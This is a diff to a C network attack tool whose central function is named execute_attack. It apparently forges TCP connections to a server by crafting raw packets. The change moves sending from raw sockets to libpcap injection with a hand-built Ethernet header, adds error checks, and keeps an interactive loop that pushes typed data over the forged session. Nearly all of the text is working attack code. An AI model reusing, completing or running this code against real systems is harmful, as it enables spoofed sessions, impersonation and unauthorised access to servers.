@@ -34,6 +34,7 @@
 
 /* terminal interactions */
 #include <termios.h>
+#include "router.h"
 
 
 /* TCP connection tracking */
@@ -75,7 +76,7 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 u_short in_cksum(u_short *addr, size_t len);
 void tcp_init(conn_t *pconn, struct sockaddr_in *psrc, struct sockaddr_in *pdst, u_long seq);
 int tcp_craft(void *output, size_t *outlen, conn_t *pconn, u_char flags, char *data, size_t len);
-int tcp_send(int s, conn_t *pconn, u_char flags, char *data, size_t len);
+int tcp_send(pcap_t *pch, conn_t *pconn, u_char flags, char *data, size_t len);
 int tcp_recv(struct pcap_pkthdr *pph, int ipoff, const void *inbuf, u_char *flags, u_long *pack, u_long *pseq, void **pdata, size_t *plen
 #ifdef DEBUG_SEQ
 	, cstate_t conn_state
@@ -87,7 +88,6 @@ void setterm(int mode);
 int kbhit(void);
 
 int lookup_host(char *hostname, struct sockaddr_in *addr);
-int get_raw_socket(void);
 int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2ip);
 
 
@@ -138,30 +138,6 @@ int main(int argc, char *argv[])
 
 	/* here we go.. WOOO */
 	return execute_attack(&myaddr, &srvaddr, &cliaddr);
-}
-
-
-/*
- * this function attempts to get a raw socket via socket(2). If we get one, we
- * check whether IP_HDRINCL is defined or not and set the socket option if it
- * is. for that, we use setsockopt(2).
- *
- * on succes, we reutrn the socket descriptor, on error, we return -1 (what
- * socket() returns on error) to report errors, use perror(3)
- */
-int get_raw_socket(void)
-{
-	int socket_descriptor, on = 1;
-
-	socket_descriptor = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-	if (socket_descriptor == -1) {
-		perror("[!] raw socket");
-	}
-#ifdef IP_HDRINCL
-	else if (setsockopt(socket_descriptor, IPPROTO_IP, IP_HDRINCL, (const void *)&on, sizeof(on)) < 0)
-		perror("[!] setsockopt(..., IP_HDRINCL, 1, ...)");
-#endif
-	return socket_descriptor;
 }
 
 
@@ -217,7 +193,7 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2
 #endif
    printf("[*] Starting capture on \"%s\" ...\n", iface);
 
-   *pcap = pcap_open_live(iface, SNAPLEN, 1, 25, errorstr);
+   *pcap = pcap_open_live(iface, SNAPLEN, 8, 25, errorstr);
 #ifdef DEVICE
    free(iface);
 #endif
@@ -284,7 +260,7 @@ int start_pcap(pcap_t **pcap, struct sockaddr_in *psrv, u_short lport, int *off2
  */
 int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct sockaddr_in *pcli)
 {
-	int rsd, lport = getpid() + 1000;
+	int lport = getpid() + 1000;
 	conn_t legit_conn;
 	int ipoff = 0;
 	pcap_t *pch = NULL;
@@ -293,9 +269,6 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 	int pcret;
 	char outbuf[8192];
 	int outlen = 0;
-
-	if ((rsd = get_raw_socket()) == -1)
-	   return 1;
 
 	printf("[*] Selected local port: %d\n", lport);
 
@@ -309,7 +282,7 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 
 	/* first, make a legit connection to the server */
 	tcp_init(&legit_conn, ploc, psrv, getpid() * 3000);
-	if (!tcp_send(rsd, &legit_conn, TH_SYN, NULL, 0))
+	if (!tcp_send(pch, &legit_conn, TH_SYN, NULL, 0))
 		return 1;
 	legit_conn.state = CS_SYN_SENT;
 
@@ -340,7 +313,8 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 							/* we need to ACK the seq */
 							legit_conn.seq = rack;
 							legit_conn.ack = rseq + 1;
-							tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
+							if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+								return 1;
 							legit_conn.state = CS_CONNECTED;
 
 							printf("tcp handshake complete.. proceed with what you planned to do..\n");
@@ -376,8 +350,10 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 						else if (flags & TH_FIN) {
 							printf("[*] FIN received\n");
 							legit_conn.ack++;
-							tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
-							tcp_send(rsd, &legit_conn, TH_FIN, NULL, 0);
+							if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+								return 1;
+							if (!tcp_send(pch, &legit_conn, TH_FIN, NULL, 0))
+								return 1;
 							legit_conn.state++;
 						}
 
@@ -415,7 +391,8 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 				case 0xa: // LF
 				case 0xd: // CR
 					outbuf[outlen++] = '\n';
-					tcp_send(rsd, &legit_conn, TH_PUSH|TH_ACK, outbuf, outlen);
+					if (!tcp_send(pch, &legit_conn, TH_PUSH|TH_ACK, outbuf, outlen))
+						return 1;
 					legit_conn.seq += outlen;
 					outlen = 0;
 					break;
@@ -428,10 +405,12 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 
 				case 0x1b: // ^[ (ESC)
 					printf("[*] Connection closed.\n");
-					tcp_send(rsd, &legit_conn, TH_FIN, NULL, 0);
+					if (!tcp_send(pch, &legit_conn, TH_FIN, NULL, 0))
+						return 1;
 					legit_conn.seq++;
 					sleep(1);
-					tcp_send(rsd, &legit_conn, TH_ACK, NULL, 0);
+					if (!tcp_send(pch, &legit_conn, TH_ACK, NULL, 0))
+						return 1;
 					legit_conn.state = CS_FINISHED;
 					break;
 
@@ -440,12 +419,10 @@ int execute_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct so
 					break;
 			}
 		}
-
 	}
 
 	setterm(1);
 	pcap_close(pch);
-	close(rsd);
 	return 0;
 }
 
@@ -570,28 +547,20 @@ int tcp_craft(void *output, size_t *outlen, conn_t *pconn, u_char flags, char *d
 
 
 /*
- * send the specified packet using libpcap
+ * craft and send a packet using libpcap
  */
-int tcp_send_pcap(pcap_t *pch, void *pkt, size_t pktlen)
-{
-	return pcap_sendpacket(pch, pkt, pktlen);
-}
-
-
-/*
- * craft and send a tcp packet (easy mode)
- */
-int tcp_send(int s, conn_t *pconn, u_char flags, char *data, size_t len)
+int tcp_send(pcap_t *pch, conn_t *pconn, u_char flags, char *data, size_t len)
 {
 	char packet[8192];
-	size_t pktlen = sizeof(packet);
+	size_t pktlen = sizeof(packet) - 14;
 
-	if (!tcp_craft(packet, &pktlen, pconn, flags, data, len))
+	memcpy(packet, ROUTER_MAC LOCAL_MAC "\x08\x00", 14);
+	if (!tcp_craft(packet + 14, &pktlen, pconn, flags, data, len))
 		return 0;
+	pktlen += 14;
 
-	if (sendto(s, packet, pktlen, 0, (struct sockaddr *)pconn->dst,
-				sizeof(struct sockaddr_in)) == -1) {
-		perror("[!] sendto() failed");
+	if (pcap_sendpacket(pch, (void *)packet, pktlen) == -1) {
+		fprintf(stderr, "[!] pcap_sendpacket failed!\n");
 		return 0;
 	}
 
